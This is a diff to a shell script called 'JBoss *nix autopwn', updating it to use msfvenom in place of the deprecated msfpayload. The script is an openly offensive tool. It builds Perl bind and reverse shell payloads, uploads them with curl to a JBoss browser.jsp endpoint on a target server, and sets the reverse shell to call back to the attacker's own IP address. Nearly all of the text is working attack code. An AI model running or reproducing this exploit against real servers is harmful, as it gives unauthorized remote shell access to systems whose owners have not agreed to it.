@@ -18,6 +18,8 @@
 #    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 
+# Updated to use msfconsole and msfvenom by Darkerego, as msfcli and msfpayload are deprecated
+
 if [ -z $1 ]
 then
 printf "[!] JBoss *nix autopwn\n[!] Usage: $0 server port\n"
@@ -56,7 +58,8 @@ if [ $shell == "bind" ]
 then
 printf "[!] On which port would you like the bindshell to listen on? "
 read port
-framework3/msfpayload cmd/unix/bind_perl LPORT=$port R >payload 
+# msfpayload deprecated,use msfvenom
+msfvenom -p cmd/unix/bind_perl LPORT=$port R >payload
 printf "[x] Uploading bind shell payload..\n"
 curl -F "dir=/tmp" -F "sort=1" -F "name=MyFile" -F "filename=@payload" -F "Submit=Upload" http://$1:$2/browser/browser/browser.jsp 1>/dev/null 2>/dev/null
 printf "[x] Verifying if upload was successful...\n"
@@ -80,7 +83,7 @@ then
 myip=`ifconfig -a | grep -i "inet" | cut -d: -f2 | awk '{print $1}' | head -n1`
 printf "[!] On which port would you like to accept the reverse shell on? "
 read port
-framework3/msfpayload cmd/unix/reverse_perl LHOST=$myip LPORT=$port R >payload 
+msfvenom -p cmd/unix/reverse_perl LHOST=$myip LPORT=$port R >payload 
 printf "[x] Uploading reverse shell payload..\n"
 curl -F "dir=/tmp" -F "sort=1" -F "name=MyFile" -F "filename=@payload" -F "Submit=Upload" http://$1:$2/browser/browser/browser.jsp 1>/dev/null 2>/dev/null
 printf "[x] Verifying if upload was successful...\n"
